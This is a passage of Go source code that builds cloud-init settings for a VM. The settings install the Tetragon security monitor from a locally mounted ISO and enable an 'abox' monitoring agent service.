    content: |
      [Unit]
      Description=abox Monitor Agent`,
		`  - path: /etc/tetragon/tetragon.tp.d/abox-monitor.yaml
    permissions: '0644'
    content: |
      # stub policy`)

	runcmd := []string{
		"  - mkdir -p /etc/tetragon/tetragon.tp.d",
		"  - |\n    # Mount cidata ISO and install Tetragon from it (ISO piggyback approach)\n    mkdir -p /mnt/cidata\n    mount -o ro /dev/sr0 /mnt/cidata\n    cp /mnt/cidata/tetragon.tar.gz /tmp/\n    umount /mnt/cidata\n    mkdir -p /tmp/tetragon-extract\n    tar -xzf /tmp/tetragon.tar.gz -C /tmp/tetragon-extract\n    cd /tmp/tetragon-extract/tetragon-" + s.version + "-amd64 && test -f install.sh && ./install.sh\n    rm -rf /tmp/tetragon-extract /tmp/tetragon.tar.gz",
		"  - systemctl daemon-reload",
		"  - systemctl enable tetragon",
		"  - systemctl start tetragon",
		"  - systemctl enable abox-monitor",
		"  - systemctl start abox-monitor",
	}

	isoFiles := make(map[string]string)
	if s.tarball != "" {
		isoFiles["tetragon.tar.gz"] = s.tarball
	}

	return &Contribution{
		WriteFiles: writeFiles,
		Runcmd:     runcmd,
		ISOFiles:   isoFiles,
	}, nil
}
